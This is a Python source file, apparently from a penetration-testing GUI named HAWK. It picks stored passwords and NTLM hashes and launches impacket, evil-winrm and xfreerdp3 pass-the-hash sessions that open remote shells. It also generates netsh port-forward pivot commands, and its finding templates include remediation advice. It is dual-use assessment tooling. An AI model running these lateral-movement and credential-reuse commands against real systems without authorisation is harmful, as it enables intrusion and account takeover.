# HAWK — Hostile Assessment War-Kit
# Copyright 2026 Lorenzo Serafini
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# A copy of the License is provided in the LICENSE file at the root
# of this distribution, or at http://www.apache.org/licenses/LICENSE-2.0
#
# Attribution "Created by Lorenzo Serafini" must be preserved in all
# redistributed and Derivative Works — see NOTICE for details.

"""
HAWK - Kill Chain Card Widget v1.0
- Port-aware routing for all tools
- Hydra: wordlist dropdown from metasploit/seclists + browse
- MSF card: check DB + guide user
- Nmap custom: free command field
- Right-click context menu on all entries
- smbclient/crackmapexec → auto-populate intel
- ssh_banner/ftp_anon port-aware fix
- No popup for 0 ports found
- WinRM excluded from HTTP tools
"""

import customtkinter as ctk
import tkinter as tk
import os
import re
import glob
import time
import subprocess
import threading
import shlex
import json
import zipfile
import tempfile
import shutil
import socket
import random
import string
import uuid
from datetime import datetime
from pathlib import Path

from utils.runner import ToolRunner, MultiRunner, MetasploitRunner, GreenBoneRunner
from utils.session import Credential
from gui.widgets.card_common import *

class CardADRoutesMixin:
    def _usable_creds_for_impacket(self, target: str) -> list:
        """Enumerate every credential in the store (regular + AD
        RESULTS sub-section) that COULD successfully authenticate an
        impacket-style call against `target`.

        Filters:
          - username not anonymous/guest/null/empty
          - has a real password OR an NTLM hash
          - cred_type is one of {cleartext, NTLM, NTLMv2, Kerberos}
            (skip AS-REP/TGS hashes — those need cracking first)

        Sort order (best match first):
          1. host exact-match AND service ∈ {SMB,WINRM,AD,KERBEROS}
          2. host exact-match
          3. AD RESULTS category OR service=AD (domain-scoped)
          4. anything else with a usable credential
        """
        try:
            sess = self.app.session_manager.current
            if sess is None:
                return []
            creds = sess.get_credentials()
        except Exception:
            return []

        # cred_types that can go straight into a -p or -hashes arg.
        # TGS/AS-REP hashes need to be cracked offline first — they
        # are NOT directly usable against the DC.
        _USABLE_TYPES = {"cleartext", "ntlm", "ntlmv2",
                          "kerberos", ""}

        usable = []
        for c in creds:
            u = (getattr(c, "username", "") or "").strip()
            if u.lower() in self._ANON_USERS_IMPACKET:
                continue
            p = (getattr(c, "password", "") or "").strip()
            h = (getattr(c, "hash_val", "") or "").strip()
            if not (p or h):
                continue
            ctype = (getattr(c, "cred_type", "") or "").lower()
            if ctype and ctype not in _USABLE_TYPES:
                # kerberos-tgs / kerberos-asrep are types stored when
                # we roast — they need hashcat first.  Skip.
                if "tgs" in ctype or "asrep" in ctype:
                    continue
            usable.append(c)

        target_l = (target or "").lower()

        def _score(c):
            host = (getattr(c, "host", "") or "").lower()
            svcs = {(s or "").upper() for s in (c.services or [])}
            cat  = (getattr(c, "category", "") or "").lower()
            host_match = (host == target_l)
            host_svc_match = host_match and bool(
                svcs & {"SMB", "WINRM", "AD", "KERBEROS"})
            ad_scoped = (cat == "ad_result" or "AD" in svcs)
            # Lower tuple = better rank.
            return (0 if host_svc_match else
                    1 if host_match else
                    2 if ad_scoped else 3,
                    0 if c.password else 1,  # cleartext before hash
                    (c.username or "").lower())

        usable.sort(key=_score)
        return usable

    def _route_impacket_auth(self, tool):
        """Unified auth dialog for every impacket tool that expects
        `user:pass@target`.  Fields:
           • Username   (default 'Administrator')
           • Password   (or leave blank and fill NTLM hash)
           • NTLM hash  (optional, for pass-the-hash)
           • Domain     (optional, picked from session.target_domain)

        Flow by # of usable credentials in the store:
          · 0 usable → dialog with empty defaults + hint
          · 1 usable → dialog pre-filled from that single cred
          · ≥ 2     → picker dialog first; selected cred pre-fills
                      the auth dialog

        Anonymous/guest/null creds are EXCLUDED from picker and
        auto-fill — impacket tools don't accept them and pre-filling
        with 'Anonymous:Anonymous' was the user-reported bug.
        """
        from gui.dialogs import (_make_win, _title, _sub, _note_box,
                                 _btn_row, _btn, _safe_destroy)
        target = self._get_target()
        if not target:
            return

        usable = self._usable_creds_for_impacket(target)

        # 2+ creds → picker first.
        if len(usable) >= 2:
            def _after_pick(chosen):
                du = (chosen.username or "").strip() or "Administrator"
                dp = (chosen.password or "").strip()
                dh = (getattr(chosen, "hash_val", "") or "").strip()
                try:
                    sess = self.app.session_manager.current
                    dd = (getattr(sess, "target_domain", "") or ""
                          if sess else "")
                except Exception:
                    dd = ""
                self._open_impacket_auth_dialog(
                    tool, target, du, dp, dh, dd)

            self._show_impacket_cred_picker(
                tool, target, usable, _after_pick)
            return

        # 0 or 1 cred → dialog directly.
        if usable:
            c = usable[0]
            du = (c.username or "").strip() or "Administrator"
            dp = (c.password or "").strip()
            dh = (getattr(c, "hash_val", "") or "").strip()
        else:
            du, dp, dh = "Administrator", "", ""
        try:
            sess = self.app.session_manager.current
            dd = (getattr(sess, "target_domain", "") or ""
                  if sess else "")
        except Exception:
            dd = ""
        self._open_impacket_auth_dialog(
            tool, target, du, dp, dh, dd,
            empty_store_hint=not usable)

    def _show_impacket_cred_picker(self, tool, target, usable_creds,
                                    on_pick):
        """Modal dialog listing all usable credentials in the store
        for the user to choose which one to feed into the impacket
        auth dialog.

        Creds are grouped visually:
          §  AD RESULTS     — category=="ad_result" entries
          §  REGULAR        — everything else

        Each row shows:  user  |  pass or :NTHASH  |  host/domain  |
        services.  The row with best relevance score is pre-selected.
        """
        from gui.dialogs import (_make_win, _title, _sub, _note_box,
                                 _btn_row, _btn, _safe_destroy)

        win = _make_win(
            self,
            f"Impacket — pick credential ({len(usable_creds)} available)",
            780, 620)
        _title(win, f"{tool.name} — pick a credential")
        _sub(win,
             f"Target: {target}  ·  {len(usable_creds)} usable "
             f"entries in Credential Store",
             COLORS["text_dim"])
        _note_box(
            win,
            "Pick ONE credential below.  The highlighted entry is "
            "the best match for this target (host+service match, "
            "cleartext preferred over hash).  Anonymous/guest creds "
            "were filtered out — impacket never accepts them.",
            COLORS["border_dim"])

        # Scrollable body for the list.
        _outer = win
        body = ctk.CTkScrollableFrame(
            _outer, fg_color="transparent",
            scrollbar_button_color=COLORS["border_dim"],
            scrollbar_button_hover_color=COLORS["border_green"])
        body.pack(fill="both", expand=True, padx=0, pady=(0, 2))

        # Split into AD RESULTS vs REGULAR.
        ad_creds = [c for c in usable_creds
                    if (getattr(c, "category", "") or "").lower()
                        == "ad_result"]
        reg_creds = [c for c in usable_creds
                     if (getattr(c, "category", "") or "").lower()
                         != "ad_result"]

        # Selection state — index into usable_creds (flattened).
        sel_idx = ctk.IntVar(value=0)

        def _render_section(title_text, creds_subset, color):
            if not creds_subset:
                return
            ctk.CTkLabel(
                body, text=f"  ◇  {title_text}",
                font=_f("md", True), text_color=color, anchor="w",
            ).pack(fill="x", padx=14, pady=(10, 2))
            for c in creds_subset:
                idx = usable_creds.index(c)
                row = ctk.CTkFrame(
                    body, fg_color=COLORS["bg_card"],
                    border_color=COLORS["border_dim"],
                    border_width=1, corner_radius=3)
                row.pack(fill="x", padx=14, pady=2)

                # Radio + username
                rbf = ctk.CTkFrame(row, fg_color="transparent")
                rbf.pack(fill="x", padx=6, pady=4)
                ctk.CTkRadioButton(
                    rbf, text="", variable=sel_idx, value=idx,
                    font=_f("sm"), width=20,
                    fg_color=COLORS["border_green"],
                    border_color=COLORS["border_dim"],
                ).pack(side="left")
                ctk.CTkLabel(
                    rbf, text=c.username or "(no username)",
                    font=_f("md", True),
                    text_color=COLORS["text_bright"],
                    anchor="w", width=180,
                ).pack(side="left")

                # Secret — show password if short, else mask hash
                secret = ""
                if c.password:
                    pwd = c.password
                    secret = (pwd if len(pwd) <= 24
                              else pwd[:20] + "…")
                elif getattr(c, "hash_val", ""):
                    h = c.hash_val
                    # Show last 12 chars of hash for identification
                    # without leaking the full thing to shoulder-
                    # surfers.
                    secret = f":…{h[-12:]}" if len(h) > 12 else h
                ctk.CTkLabel(
                    rbf, text=secret,
                    font=_f("sm"),
                    text_color=COLORS["text_green"],
                    anchor="w", width=220,
                ).pack(side="left")

                # Host / services
                host = getattr(c, "host", "") or "?"
                svcs = ", ".join(c.services or []) or "?"
                meta = f"{host}  ·  {svcs}"
                ctk.CTkLabel(
                    rbf, text=meta,
                    font=_f("xs"),
                    text_color=COLORS["text_dim"],
                    anchor="e",
                ).pack(side="right", padx=(0, 4))

        _render_section("AD RESULTS", ad_creds,
                         COLORS["text_red"])
        _render_section("REGULAR CREDENTIALS", reg_creds,
                         COLORS["text_cyan"])

        win = _outer

        def _use_selected():
            idx = sel_idx.get()
            if idx < 0 or idx >= len(usable_creds):
                return
            chosen = usable_creds[idx]
            _safe_destroy(win)
            on_pick(chosen)

        def _use_none():
            """Skip the picker — open the dialog with no pre-fill so
            the user can type creds manually.  Useful if none of the
            stored creds are the right one for this specific tool."""
            _safe_destroy(win)
            try:
                sess = self.app.session_manager.current
                dd = (getattr(sess, "target_domain", "") or ""
                      if sess else "")
            except Exception:
                dd = ""
            self._open_impacket_auth_dialog(
                tool, target, "Administrator", "", "", dd,
                empty_store_hint=False)

        row = _btn_row(win)
        _btn(row, "USE SELECTED", _use_selected,
             primary=True, w=180)
        _btn(row, "ENTER MANUALLY", _use_none, w=180)
        _btn(row, "CANCEL", lambda: _safe_destroy(win), w=100)

    def _open_impacket_auth_dialog(self, tool, target, du, dp, dh, dd,
                                    empty_store_hint=False):
        """The original impacket auth dialog, now accepting explicit
        defaults from either the picker OR the single-cred auto-fill
        path in _route_impacket_auth."""
        from gui.dialogs import (_make_win, _title, _sub, _note_box,
                                 _btn_row, _btn, _safe_destroy)

        win = _make_win(self, f"Impacket — {tool.name}", 560, 380)
        _title(win, f"{tool.name} — Authentication")
        _sub(win, f"Target: {target}", COLORS["text_dim"])

        def _row(label, var, show="", hint=""):
            f = ctk.CTkFrame(win, fg_color="transparent")
            f.pack(fill="x", padx=24, pady=(4, 0))
            ctk.CTkLabel(f, text=label, width=110, anchor="w",
                         font=_f("sm", True),
                         text_color=COLORS["text_bright"]).pack(side="left")
            e = ctk.CTkEntry(f, textvariable=var, font=_f("sm"),
                             height=30, show=show,
                             fg_color=COLORS["bg_card"],
                             text_color=COLORS["text_bright"],
                             border_color=COLORS["border_green"],
                             border_width=1, corner_radius=3)
            e.pack(side="left", fill="x", expand=True)
            add_context_menu(e)
            if hint:
                ctk.CTkLabel(win, text=hint, font=_f("xs"),
                             text_color=COLORS["text_dim"],
                             anchor="w").pack(fill="x", padx=24)
            return e

        user_var   = ctk.StringVar(value=du)
        pass_var   = ctk.StringVar(value=dp)
        hash_var   = ctk.StringVar(value=dh)
        domain_var = ctk.StringVar(value=dd)

        _row("Username",  user_var,   "",  "default 'Administrator'")
        _row("Password",  pass_var,   "",  "leave blank if using NTLM hash")
        _row("NTLM hash", hash_var,   "",  "optional — pass-the-hash, overrides password")
        _row("Domain",    domain_var, "",  "optional — pre-filled from session target_domain")

        if empty_store_hint:
            _note_box(
                win,
                "No suitable credentials in the Credential Store for "
                "this target — type the username and password (or "
                "NTLM hash) manually.  Anonymous / guest accounts "
                "won't authenticate against psexec / secretsdump / "
                "wmiexec, so HAWK never auto-fills them.",
                COLORS["border_amber"])
        else:
            _note_box(
                win,
                "Fields are pre-filled from the Credential Store.  "
                "Either a password OR an NTLM hash is required; the "
                "tool picks the right impacket flag automatically.  "
                "Edit freely — typed values override the pre-fill.",
                COLORS["border_dim"])

        # ── Per-tool admin requirement warning ────────────────────
        if tool.id == "impacket_wmiexec":
            _note_box(
                win,
                "⚠  WMIEXEC REQUIRES LOCAL ADMIN ON THE TARGET\n\n"
                "WMI remote access (port 135 + dynamic RPC) and the "
                "ADMIN$ share used to read command output are restricted "
                "to local administrators by default.\n\n"
                "If you authenticate as a normal domain user you will "
                "get ACCESS_DENIED or complete silence — the tool exits "
                "with no error message.\n\n"
                "→ Use 'Administrator' or any local admin account.\n"
                "→ Pass-the-hash (-hashes :NTHASH) works if you have "
                "the admin NTLM hash from secretsdump.\n\n"
                "Output appears in the xterm window.  HAWK does not "
                "capture or parse interactive shell sessions — use the "
                "shell to run your commands and copy results manually.",
                COLORS["text_red"])
        elif tool.id == "impacket_atexec":
            _note_box(
                win,
                "⚠  ATEXEC REQUIRES LOCAL ADMIN ON THE TARGET\n\n"
                "The Task Scheduler RPC interface (ITaskSchedulerService, "
                "port 445 / SMB) only allows remote task creation for "
                "local administrators.\n\n"
                "If you authenticate as a normal domain user you will "
                "get ACCESS_DENIED with no further output — the command "
                "is never executed.\n\n"
                "→ Use 'Administrator' or any local admin account.\n"
                "→ Pass-the-hash (-hashes :NTHASH) works if you have "
                "the admin NTLM hash from secretsdump.\n\n"
                "Output appears in the xterm window.  HAWK does not "
                "capture or parse atexec output — results are shown "
                "only in the terminal window.",
                COLORS["text_red"])

        def _run():
            u = user_var.get().strip()
            p = pass_var.get()
            h = hash_var.get().strip()
            d = domain_var.get().strip()
            if not u:
                self.app.terminal.write(
                    "[!] impacket cancelled — username is required.", "warn")
                return
            if not p and not h:
                self.app.terminal.write(
                    "[!] impacket cancelled — supply either password or "
                    "NTLM hash.", "warn")
                return

            # Build the user@host part; prepend domain if given so
            # Kerberos/NTLM negotiates correctly on AD targets.
            if d:
                user_part = f"{d}/{u}"
            else:
                user_part = u

            # Base command — each tool id maps to its own binary.
            bin_map = {
                "impacket_psexec":        "impacket-psexec",
                "impacket_secretsdump":   "impacket-secretsdump",
                "impacket_wmiexec":       "impacket-wmiexec",
                "impacket_atexec":        "impacket-atexec",
                "impacket_dcomexec":      "impacket-dcomexec",
                "impacket_smbclient":     "impacket-smbclient",
                "impacket_mssqlclient":   "impacket-mssqlclient",
                "impacket_lookupsid":     "impacket-lookupsid",
                "impacket_samrdump":      "impacket-samrdump",
                "impacket_rpcdump":       "impacket-rpcdump",
                "impacket_goldenpac":     "impacket-goldenPac",
                "evil_winrm":            "evil-winrm",
            }
            bin_ = bin_map.get(tool.id, tool.binary)

            if tool.id == "evil_winrm":
                if h:
                    nt_only = h.split(":")[-1] if ":" in h else h
                    cmd = (f"{bin_} -i {target} -u {_shq(u)} "
                           f"-H {_shq(nt_only)}")
                else:
                    cmd = (f"{bin_} -i {target} -u {_shq(u)} "
                           f"-p {_shq(p)}")
            elif h:
                # impacket accepts LM:NT or just :NT — if the user
                # pasted LM:NT with colon, pass through; otherwise
                # assume NT-only and prefix an empty LM.
                nt_fmt = h if ":" in h else f":{h}"
                cmd = (f"{bin_} {_shq(user_part)}@{target} "
                       f"-hashes {_shq(nt_fmt)} -no-pass")
            else:
                cmd = f"{bin_} {_shq(user_part)}:{_shq(p)}@{target}"

            _safe_destroy(win)

            # Interactive tools (psexec, wmiexec, atexec, dcomexec,
            # smbclient, mssqlclient) drop the user into a remote shell
            # — they need a real tty with stdin for command input.
            # Launch them in a new xterm instead of piping through the
            # ToolRunner (which has no stdin feeder and would just kill
            # the session after a few seconds as "hung").  Non-
            # interactive impacket helpers (secretsdump, lookupsid,
            # samrdump, rpcdump, goldenpac) stay in ToolRunner so their
            # output lands in HAWK's terminal.
            _INTERACTIVE_IMPACKET = {
                "impacket_psexec", "impacket_wmiexec", "impacket_atexec",
                "impacket_dcomexec", "impacket_smbclient",
                "impacket_mssqlclient", "evil_winrm",
            }
            if tool.id in _INTERACTIVE_IMPACKET:
                from utils.runner import _open_terminal
                self.app.terminal.section(
                    f"EXPLOITATION  ·  {tool.name}")
                self.app.terminal.write(
                    f"  $ {cmd}", "cmd")
                self.app.terminal.write(
                    f"  [*] Interactive shell opening in a new "
                    f"terminal window — type commands there.\n"
                    f"      Close the window or press Ctrl-D to end "
                    f"the session.",
                    "info")
                title = f"HAWK — {tool.name} → {target}"
                keep_open = (
                    f"echo -e '\\e[36m$ {cmd}\\e[0m'; "
                    f"{cmd}; "
                    f"echo ''; echo -e '\\e[33m[HAWK] Session ended. "
                    f"Ctrl-D or close to exit.\\e[0m'; "
                    f"exec bash"
                )
                ok = _open_terminal(title, keep_open)
                if not ok:
                    self.app.terminal.write(
                        "[!] No terminal emulator available. "
                        "Install xterm: sudo apt install -y xterm",
                        "error")
                    return

                self._set_tool_status(tool.id, "done")
                try:
                    sess = self.app.session_manager.current
                    if sess is not None:
                        eid = sess.start_tool_execution(
                            tool_id=tool.id, tool_name=tool.name,
                            phase_id=getattr(self, "phase_id", ""),
                            command=cmd)
                        if eid:
                            sess.finish_tool_execution(
                                eid, 0, ["(interactive xterm session)"],
                                "done")
                except Exception:
                    pass

                _EXEC_FINDING = {
                    "evil_winrm": (
                        "EVIL-WINRM",
                        "WinRM shell on {t}",
                        "WinRM shell session opened via evil-winrm.\n\n"
                        "  Target : {t}:5985\n"
                        "  Auth   : {a}\n"
                        "  Domain : {dom}\n\n"
                        "A working WinRM shell gives full interactive "
                        "PowerShell access — equivalent to RDP without "
                        "the GUI.\n\n"
                        "Remediation:\n"
                        "  • Disable WinRM if not needed: "
                        "Disable-PSRemoting -Force\n"
                        "  • Restrict WinRM to management VLANs "
                        "via Windows Firewall\n"
                        "  • Enforce Kerberos-only auth (disable NTLM)",
                    ),
                    "impacket_wmiexec": (
                        "WMIEXEC",
                        "WMI remote shell on {t}",
                        "Remote command execution via WMI "
                        "(Win32_Process.Create).\n\n"
                        "  Target : {t}:135 (RPC)\n"
                        "  Auth   : {a}\n"
                        "  Domain : {dom}\n\n"
                        "WMI exec spawns processes on the target "
                        "without installing a service.  Smaller "
                        "footprint than psexec but still full RCE.\n\n"
                        "Remediation:\n"
                        "  • Restrict remote WMI: "
                        "Set-PSSessionConfiguration -ShowSecurityDescriptorUI\n"
                        "  • Block RPC 135 + dynamic ports from "
                        "untrusted VLANs\n"
                        "  • Monitor WMI process-creation events "
                        "(Sysmon Event ID 1, ParentImage wmiprvse.exe)",
                    ),
                    "impacket_psexec": (
                        "PSEXEC",
                        "PsExec SYSTEM shell on {t}",
                        "Remote SYSTEM shell obtained via impacket-psexec "
                        "(SMB service install).\n\n"
                        "  Target : {t}:445 (SMB)\n"
                        "  Auth   : {a}\n"
                        "  Domain : {dom}\n\n"
                        "PsExec uploads a service binary to ADMIN$, "
                        "installs it as a Windows service, and executes "
                        "as SYSTEM.  Noisy (antivirus + event logs) but "
                        "gives highest privilege.\n\n"
                        "Remediation:\n"
                        "  • Restrict ADMIN$ share access to "
                        "domain admins only\n"
                        "  • Enable Windows Firewall rule blocking "
                        "inbound SMB from workstations\n"
                        "  • Monitor service-install events "
                        "(Event ID 7045, random service names)",
                    ),
                    "impacket_atexec": (
                        "ATEXEC",
                        "Task Scheduler exec on {t}",
                        "Remote command execution via Windows Task "
                        "Scheduler (ITaskSchedulerService RPC).\n\n"
                        "  Target : {t}:445 (SMB)\n"
                        "  Auth   : {a}\n"
                        "  Domain : {dom}\n\n"
                        "AtExec creates a scheduled task, runs the "
                        "command immediately, reads output from a temp "
                        "file, then deletes the task.  Useful when "
                        "psexec/wmiexec are blocked.\n\n"
                        "Remediation:\n"
                        "  • Restrict remote task creation: "
                        "GPO > Computer > Admin Templates > "
                        "Task Scheduler\n"
                        "  • Monitor task-creation events "
                        "(Event ID 4698)\n"
                        "  • Block inbound SMB from untrusted VLANs",
                    ),
                    "impacket_dcomexec": (
                        "DCOMEXEC",
                        "DCOM remote shell on {t}",
                        "Remote command execution via DCOM "
                        "(ShellBrowserWindow / MMC20.Application).\n\n"
                        "  Target : {t}:135 (RPC)\n"
                        "  Auth   : {a}\n"
                        "  Domain : {dom}\n\n"
                        "DCOM exec leverages legitimate COM objects "
                        "for lateral movement.  Less common in logs "
                        "than psexec/wmiexec.\n\n"
                        "Remediation:\n"
                        "  • Restrict remote DCOM: dcomcnfg > "
                        "Default Permissions > remove non-admin\n"
                        "  • Block RPC 135 + dynamic ports from "
                        "untrusted VLANs\n"
                        "  • Monitor DCOM process spawns "
                        "(Sysmon Event ID 1, ParentImage svchost.exe "
                        "-k DcomLaunch)",
                    ),
                }
                _finding = _EXEC_FINDING.get(tool.id)
                if _finding:
                    try:
                        from utils.run_id import new_run_id
                        auth = f"{u} (hash)" if h else f"{u} (password)"
                        src, ttl, desc = _finding
                        fmt = {"t": target, "a": auth,
                               "dom": d or "(none)"}
                        self.app.target_intel.add_auto_finding(
                            title=f"{src} — {ttl.format(**fmt)}",
                            description=desc.format(**fmt),
                            severity="high",
                            source=src,
                            linked_run_id=new_run_id(),
                            replace=True)
                    except Exception:
                        pass
                return

            # Non-interactive — run through the normal pipeline.
            self._run_raw(tool, cmd)

        row = _btn_row(win)
        _btn(row, "RUN", _run, primary=True, w=120)
        _btn(row, "CANCEL", lambda: _safe_destroy(win))

    def _route_rdp_connect(self, tool):
        """Auth dialog for xfreerdp3 RDP Connect.

        xfreerdp3 uses /u: /p: /pth: flags — completely different from
        the impacket user:pass@host format, so it gets its own dialog.

        Supports:
          • username + password  → /u:<user> /p:<password>
          • pass-the-hash        → /u:<user> /pth:<NTHASH>  (no password)
          • optional domain      → /d:<domain>
        """
        from gui.dialogs import (_make_win, _title, _sub, _note_box,
                                 _btn_row, _btn, _safe_destroy)

        target = self._get_target()
        if not target:
            return

        # Pre-fill from cred store (reuse same usable-creds logic)
        usable = self._usable_creds_for_impacket(target)
        if usable:
            c = usable[0]
            du = (c.username or "").strip() or "Administrator"
            dp = (c.password or "").strip()
            dh = (getattr(c, "hash_val", "") or "").strip()
        else:
            du, dp, dh = "Administrator", "", ""
        try:
            sess = self.app.session_manager.current
            dd = getattr(sess, "target_domain", "") or "" if sess else ""
        except Exception:
            dd = ""

        win = _make_win(self, "RDP Connect", 560, 420)
        _title(win, "RDP CONNECT — xfreerdp3")
        _sub(win, f"Target: {target}  (port 3389)", COLORS["text_dim"])

        _note_box(
            win,
            "⚠  PREREQUISITES\n"
            "• RDP must be enabled on the target (port 3389 open,\n"
            "  fDenyTSConnections = 0 in the registry).\n"
            "  Use the 'RDP Enable (via shell)' card first if needed.\n"
            "• You need valid credentials: local admin or domain user\n"
            "  with 'Allow log on through Remote Desktop Services' right.\n"
            "  A normal unprivileged domain user may be denied unless\n"
            "  explicitly added to the Remote Desktop Users group.\n\n"
            "xfreerdp3 opens its own graphical window.  HAWK does not\n"
            "capture or parse the RDP session.",
            COLORS["text_yellow"])

        def _row(label, var, show="", hint=""):
            f = ctk.CTkFrame(win, fg_color="transparent")
            f.pack(fill="x", padx=24, pady=(4, 0))
            ctk.CTkLabel(f, text=label, width=110, anchor="w",
                         font=_f("sm", True),
                         text_color=COLORS["text_bright"]).pack(side="left")
            e = ctk.CTkEntry(f, textvariable=var, font=_f("sm"),
                             height=30, show=show,
                             fg_color=COLORS["bg_card"],
                             text_color=COLORS["text_bright"],
                             border_color=COLORS["border_green"],
                             border_width=1, corner_radius=3)
            e.pack(side="left", fill="x", expand=True)
            add_context_menu(e)
            if hint:
                ctk.CTkLabel(win, text=hint, font=_f("xs"),
                             text_color=COLORS["text_dim"],
                             anchor="w").pack(fill="x", padx=24)
            return e

        user_var   = ctk.StringVar(value=du)
        pass_var   = ctk.StringVar(value=dp)
        hash_var   = ctk.StringVar(value=dh)
        domain_var = ctk.StringVar(value=dd)

        _row("Username",  user_var,  "",
             "default 'Administrator'")
        _row("Password",  pass_var,  "",
             "leave blank if using NTLM hash (pass-the-hash)")
        _row("NTLM hash", hash_var,  "",
             "optional — /pth:<NTHASH> flag, overrides password")
        _row("Domain",    domain_var,"",
             "optional — /d:<domain>, for AD targets")

        def _run():
            u = user_var.get().strip()
            p = pass_var.get().strip()
            h = hash_var.get().strip()
            d = domain_var.get().strip()

            if not u:
                self.app.terminal.write(
                    "[!] RDP Connect — username is required.", "warn")
                return
            if not p and not h:
                self.app.terminal.write(
                    "[!] RDP Connect — supply either password or "
                    "NTLM hash.", "warn")
                return

            # Build xfreerdp3 command
            cmd_parts = [
                "xfreerdp3",
                f"/v:{target}",
                f"/u:{_shq(u)}",
            ]
            if d:
                cmd_parts.append(f"/d:{_shq(d)}")
            if h:
                nt = h.split(":")[-1] if ":" in h else h
                cmd_parts.append(f"/pth:{_shq(nt)}")
            else:
                cmd_parts.append(f"/p:{_shq(p)}")
            cmd_parts += [
                "/cert:ignore",
                "/tls:seclevel:0",
                "/dynamic-resolution",
            ]
            cmd = " ".join(cmd_parts)

            _safe_destroy(win)

            from utils.runner import _open_terminal
            self.app.terminal.section("LATERAL MOVEMENT  ·  RDP Connect")
            self.app.terminal.write(f"  $ {cmd}", "cmd")
            self.app.terminal.write(
                "  [*] xfreerdp3 opening — graphical RDP window "
                "will appear shortly.  If it fails, check the "
                "xterm for the error message.", "info")

            # Run in xterm so connection errors are visible
            script = (
                f"echo '═══  HAWK — RDP → {target}  ═══'; "
                f"echo ''; "
                f"{cmd}; "
                f"echo ''; "
                f"echo '[HAWK] xfreerdp3 exited.'; "
                f"read -p 'Press ENTER to close...'")
            ok = _open_terminal(f"HAWK — RDP → {target}", script)
            if not ok:
                self.app.terminal.write(
                    "[!] No terminal emulator available — "
                    "install xterm: sudo apt install -y xterm", "error")

        row = _btn_row(win)
        _btn(row, "CONNECT", _run, primary=True, w=120)
        _btn(row, "CANCEL", lambda: _safe_destroy(win))

    def _route_netsh_portfwd(self, tool):
        """Guided dialog for Netsh Port Forward.

        Collects listen_port / connect_address / connect_port, shows the
        schema Kali → target:LPORT → internal:RPORT, generates the full
        command + verify + cleanup commands ready to paste in the target shell.
        """
        from gui.dialogs import (_make_win, _title, _sub, _note_box,
                                 _btn_row, _btn, _safe_destroy,
                                 _selectable_text)

        target = ""
        try:
            sess = self.app.session_manager.current
            target = sess.target_ip if sess else ""
        except Exception:
            pass
        target = target or "<TARGET_IP>"

        win = _make_win(self, "Netsh Port Forward", 720, 600)
        _title(win, "🔀  NETSH PORT FORWARD — Windows TCP relay")
        _sub(win,
             "Run the generated command inside the target shell "
             "(meterpreter, evil-winrm, psexec, cmd).",
             COLORS["text_dim"])

        _note_box(win,
            "HOW IT WORKS\n\n"
            "netsh creates a Windows TCP relay at the kernel level — "
            "no extra binary needed, it is a built-in.\n\n"
            "   Kali  ──►  target:{LISTEN_PORT}  ──►  internal_host:{CONNECT_PORT}\n\n"
            "Use case: you have a shell on a Windows pivot and want to reach "
            "an internal host (e.g. another DC, a DB server, an intranet web app) "
            "that Kali cannot see directly.  After creating the forward, point your "
            "Kali tools at  target:{LISTEN_PORT}  and the traffic reaches the "
            "internal host transparently.",
            COLORS["text_cyan"])

        # ── Parameter fields ─────────────────────────────────────────
        param_frame = ctk.CTkFrame(win, fg_color=COLORS["bg_card"],
                                    border_color=COLORS["border_dim"],
                                    border_width=1, corner_radius=4)
        param_frame.pack(fill="x", padx=16, pady=(8, 4))
        ctk.CTkLabel(param_frame, text="  Parameters:",
                     font=_f("sm", True), text_color=COLORS["text_bright"],
                     anchor="w").pack(fill="x", padx=10, pady=(8, 4))

        row_f = ctk.CTkFrame(param_frame, fg_color="transparent")
        row_f.pack(fill="x", padx=10, pady=(0, 10))

        lport_var   = ctk.StringVar(value="8080")
        caddr_var   = ctk.StringVar(value="")
        cport_var   = ctk.StringVar(value="80")

        def _field(parent, label, var, width=120, hint=""):
            f = ctk.CTkFrame(parent, fg_color="transparent")
            f.pack(side="left", padx=(0, 16))
            ctk.CTkLabel(f, text=label, font=_f("xs"),
                         text_color=COLORS["text_dim"],
                         anchor="w").pack(anchor="w")
            e = ctk.CTkEntry(f, textvariable=var, width=width, height=28,
                             font=_f("sm"),
                             fg_color=COLORS["bg_secondary"],
                             text_color=COLORS["text_bright"],
                             border_color=COLORS["border_green"],
                             border_width=1, corner_radius=3)
            e.pack()
            if hint:
                ctk.CTkLabel(f, text=hint, font=_f("xs"),
                             text_color=COLORS["text_muted"],
                             anchor="w").pack(anchor="w")
            return e

        _field(row_f, "Listen port  (on target)",  lport_var, 120,
               "e.g. 8080 — any free port")
        _field(row_f, "Connect address  (internal)", caddr_var, 180,
               "IP of internal host to reach  ← required")
        _field(row_f, "Connect port  (internal)",  cport_var, 100,
               "e.g. 80, 443, 3389, 445…")

        # ── Live command preview ──────────────────────────────────────
        prev_frame = ctk.CTkFrame(win, fg_color=COLORS["bg_card"],
                                   border_color=COLORS["border_green"],
                                   border_width=1, corner_radius=4)
        prev_frame.pack(fill="x", padx=16, pady=4)
        ctk.CTkLabel(prev_frame,
                     text="  Generated commands — paste into target shell:",
                     font=_f("sm", True), text_color=COLORS["text_green"],
                     anchor="w").pack(fill="x", padx=10, pady=(6, 2))

        preview_box = ctk.CTkTextbox(
            prev_frame, height=130, font=("Courier New", 12),
            fg_color=COLORS["bg_secondary"],
            text_color=COLORS["text_bright"],
            border_color=COLORS["border_dim"], border_width=1,
            corner_radius=3, state="disabled")
        preview_box.pack(fill="x", padx=10, pady=(0, 8))

        def _refresh_preview(*_):
            lp = lport_var.get().strip() or "<LISTEN_PORT>"
            ca = caddr_var.get().strip() or "<CONNECT_ADDRESS>"
            cp = cport_var.get().strip() or "<CONNECT_PORT>"

            add_cmd = (
                f"netsh interface portproxy add v4tov4 "
                f"listenaddress=0.0.0.0 listenport={lp} "
                f"connectaddress={ca} connectport={cp}")
            verify_cmd = "netsh interface portproxy show all"
            remove_cmd = (
                f"netsh interface portproxy delete v4tov4 "
                f"listenaddress=0.0.0.0 listenport={lp}")

            schema = (
                f"\n# Schema:  Kali → {target}:{lp} → {ca}:{cp}\n"
                f"# On Kali after running this: point tools at {target}:{lp}\n\n")

            preview_box.configure(state="normal")
            preview_box.delete("1.0", "end")
            preview_box.insert("1.0",
                f"{schema}"
                f"# 1. CREATE forward\n{add_cmd}\n\n"
                f"# 2. VERIFY it's active\n{verify_cmd}\n\n"
                f"# 3. REMOVE when done (cleanup)\n{remove_cmd}")
            preview_box.configure(state="disabled")

        lport_var.trace_add("write", _refresh_preview)
        caddr_var.trace_add("write", _refresh_preview)
        cport_var.trace_add("write", _refresh_preview)
        _refresh_preview()

        def _copy_add():
            lp = lport_var.get().strip() or "<LISTEN_PORT>"
            ca = caddr_var.get().strip() or "<CONNECT_ADDRESS>"
